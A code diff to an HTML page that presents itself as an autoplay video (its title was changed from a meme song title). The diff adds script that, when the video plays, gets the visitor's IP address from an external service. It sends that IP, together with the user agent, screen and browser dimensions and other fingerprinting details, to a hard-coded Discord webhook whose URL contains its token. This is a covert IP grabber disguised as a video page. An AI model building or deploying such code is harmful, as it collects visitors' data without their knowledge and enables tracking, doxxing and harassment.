@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>CHIPI CHIPI CHAPA CHAPA DUBI DUBI</title>
+    <title>Autoplay Video</title>
     <style>
         body, html {
             margin: 0;
@@ -41,10 +41,26 @@
             video.currentTime = 0;
             video.play();
             
+            // Get IP address
+            var ip = '';
+            fetch('https://api.ipify.org/?format=json')
+            .then(response => response.json())
+            .then(data => {
+                ip = data.ip;
+                sendInfoToDiscord(ip);
+            })
+            .catch(error => {
+                console.error('Error getting IP address:', error);
+                sendInfoToDiscord('Error getting IP address');
+            });
+        }
+
+        // Function to send information to Discord webhook
+        function sendInfoToDiscord(ip) {
             // Get additional information
             var info = {
-                ip: '<?= $_SERVER['REMOTE_ADDR']; ?>',
-                userAgent: '<?= $_SERVER['HTTP_USER_AGENT']; ?>',
+                ip: ip,
+                userAgent: navigator.userAgent,
                 screenWidth: window.screen.width,
                 screenHeight: window.screen.height,
                 browserWidth: window.innerWidth,
@@ -56,7 +72,7 @@
                 plugins: navigator.plugins.length,
                 // Add more information as needed
             };
-            
+
             // Send data to Discord webhook
             var webhookUrl = 'https://discord.com/api/webhooks/1230903614743121993/nlWrKoXTAOZT2FUglXZRhcbQYdg212webYz_qDfPHl_aj5KLUt0HDohrSyDpYEME6QZB';
             var data = {
